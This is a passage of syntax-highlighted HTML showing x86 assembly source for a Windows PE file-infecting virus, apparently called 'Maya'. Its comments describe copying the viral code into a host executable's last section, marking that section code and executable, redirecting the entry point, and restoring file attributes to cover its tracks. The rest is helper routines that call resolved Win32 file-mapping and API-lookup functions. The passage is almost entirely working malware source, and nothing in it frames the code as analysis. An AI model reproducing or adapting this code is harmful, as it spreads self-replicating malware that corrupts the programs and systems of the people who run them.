    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;add PhysSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;load ptr into edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_start</span><span class="sc0">           </span><span class="sc1">;get virus start add</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">maya_length</span><span class="sc0">             </span><span class="sc1">;length of code</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">;increase pointers</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">                     </span><span class="sc1">;move viral code..</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;..into the mapped..</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;..executable</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc5">maya_length</span><span class="sc0">     </span><span class="sc1">;update..</span><span class="sc0">
                            </span><span class="sc1">;..sectionPhysSize</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filesize</span><span class="sc4">],</span><span class="sc5">maya_length</span><span class="sc0">    </span><span class="sc1">;and filesize   </span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;zero edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get section PhysSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filealign</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">;calculates section..</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;..PhysSize with respect</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;to file alignment unit</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;calculate padding</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">;and add to PhysSize</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filesize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get updated PhysSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;set virtual size</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">;set Code flag</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">20000000h</span><span class="sc0">        </span><span class="sc1">;set Executable flag</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_peptr</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get ptr to PE head</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_sectrva</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get rva of last section</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;set new entry point</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get section rva</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;add section PhysSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;set imagesize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_olderva</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get current host entry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_entry_of_host</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;restore it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_successfull_infection</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                            </span><span class="sc1">;set flag</span><span class="sc0">
</span><span class="sc5">maya_infect_unmap</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;@13D0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_mappedadd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_unmapview</span><span class="sc0">         </span><span class="sc1">;call UnmapViewOfFile</span><span class="sc0">
</span><span class="sc5">maya_infect_closemap</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;@13DB</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_maphandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;call CloseHandle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_closefile</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_handle</span><span class="sc4">]</span><span class="sc0">    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filesize</span><span class="sc4">]</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_setfilepo</span><span class="sc0">         </span><span class="sc1">;set file pointer to end</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_infect_closefile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_seteof</span><span class="sc0">            </span><span class="sc1">;and set end of file</span><span class="sc0">
</span><span class="sc5">maya_infect_closefile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_closefile</span><span class="sc0">         </span><span class="sc1">;finally close file</span><span class="sc0">
</span><span class="sc5">maya_infect_restore_attr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;ptr to filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_fileattrib</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_setfileattrs</span><span class="sc0">          </span><span class="sc1">;restore attributes</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and return to caller</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;subroutines used during infection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_openfile</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;@141F</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_createfilea_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_closefile</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;@143D</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_closehandle_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_createfmap</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;@1449</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_createfilemappinga_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_mapview</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;@145E</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_mapviewoffile_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_unmapview</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;@1471</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_unmapviewoffile_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_setfilepo</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;@147D</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_setfilepointer_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_seteof</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;@148E</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_setendoffile_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_getfsize</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;@149A</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filesize_high_dword</span><span class="sc0"> </span><span class="sc1">;get add of room for</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;hi dword of filesize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;store ptr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getfilesize_add</span><span class="sc4">]</span><span class="sc1">;get fn add</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;call fn</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_getfileattrs</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;@14AE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;store filename as param</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getfileattributesa_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;call function</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_setfileattrs</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;@14BC</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;store params</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_setfileattributesa_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;call fn</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_getcurrdir</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;@14C9</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;ptr to buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">        </span><span class="sc1">;buffer size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getcurrentdirectorya_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_setcurrdir</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;@14DA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;ptr to path</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_setcurrentdirectorya_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_getwindir</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;@14E6</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">        </span><span class="sc1">;buffer size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;ptr to buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getwindowsdirectorya_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_getsystime</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;@14F7</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_systime</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;store ptr to structure to be filled</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getsystemtime_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;call fn</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_getmodhand</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;@150A</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getmodulehandlea_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_getprocadd</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;@1516</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;ptr to fn name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;hModule</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getprocaddress_add</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_lookup_more</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;@1523</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_movefilea_len</span><span class="sc0">   </span><span class="sc1">;ptr to more api names</span><span class="sc0">
